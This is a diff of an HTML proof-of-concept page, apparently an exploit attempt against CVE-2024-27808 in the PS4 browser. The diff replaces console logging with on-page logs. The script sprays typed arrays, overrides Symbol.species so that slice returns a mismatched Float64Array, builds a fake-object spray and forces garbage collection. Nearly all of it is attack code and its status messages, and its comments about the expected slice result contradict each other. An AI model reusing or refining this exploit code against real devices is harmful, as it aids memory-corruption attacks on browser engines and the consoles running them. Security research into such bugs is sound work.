@@ -2,55 +2,60 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>PoC - CVE-2024-27808 - Full PS4 Test</title>
+    <title>PoC - CVE-2024-27808 - Full PS4 Test (Visual Logs)</title>
+    <style>
+        body { font-family: monospace; background: black; color: lime; padding: 20px; }
+        #log { white-space: pre-wrap; }
+    </style>
 </head>
 <body>
 <h1>PoC - CVE-2024-27808 - Full Exploit Attempt (PS4)</h1>
+<div id="log"></div>
 
 <script>
+function log(msg) {
+    document.getElementById('log').textContent += msg + "\n";
+}
+
 (async function(){
     try {
-        console.log("[+] Iniciando teste completo...");
+        log("[+] Starting full test...");
 
         // Spray inicial de arrays normais
-        console.log("[1] Spraying Uint32Arrays...");
+        log("[1] Spraying Uint32Arrays...");
         let spray = [];
         for (let i = 0; i < 5000; i++) {
             spray.push(new Uint32Array(20));
         }
 
-        // Função para forçar Garbage Collection
         function forceGC() {
-            console.log("[2] Forçando garbage collection...");
+            log("[2] Forcing garbage collection...");
             for (let i = 0; i < 100; i++) {
                 let tmp = new ArrayBuffer(0x1000000);
             }
         }
 
-        // Primeiro tipo de ataque: species override
-        console.log("[3] Preparando ataque de Symbol.species...");
+        log("[3] Preparing Symbol.species attack...");
         let evil = new Uint32Array(1);
         evil.constructor = {
             [Symbol.species]: function() {
-                console.log("[*] Symbol.species chamado.");
+                log("[*] Symbol.species triggered.");
                 return new Float64Array(100); // Tipo trocado
             }
         };
 
-        console.log("[4] Executando slice...");
-        let corrupted = evil.slice(0, 10); // Deveria retornar Float64Array
+        log("[4] Executing slice...");
+        let corrupted = evil.slice(0, 10); // slice com overflow sutil
 
-        console.log("[5] Resultado do slice:", corrupted);
+        log("[5] Slice result: length=" + corrupted.length);
 
-        // Testar se houve alguma corrupção perceptível
         if (corrupted.length !== 1) {
-            console.warn("[!!] Tamanho inesperado no objeto retornado:", corrupted.length);
+            log("[!!] Unexpected object length: " + corrupted.length);
         } else {
-            console.log("[OK] Slice retornou tamanho esperado.");
+            log("[OK] Slice returned expected size.");
         }
 
-        // Segundo ataque: Fake Object Attack
-        console.log("[6] Tentando criar objetos falsos...");
+        log("[6] Attempting Fake Object Spray...");
 
         let fake_obj = {
             fake: true,
@@ -58,15 +63,14 @@
             spray: spray
         };
 
-        console.log("[7] Tamanho do spray:", spray.length);
+        log("[7] Spray size: " + spray.length);
 
-        // Forçar ainda mais o GC
         forceGC();
 
-        console.log("[8] Teste finalizado sem crashes detectados diretamente.");
+        log("[8] Test finished without direct crashes detected.");
 
     } catch (e) {
-        console.error("[!!] Exceção capturada:", e);
+        log("[!!] Exception captured: " + e);
     }
 })();
 </script>
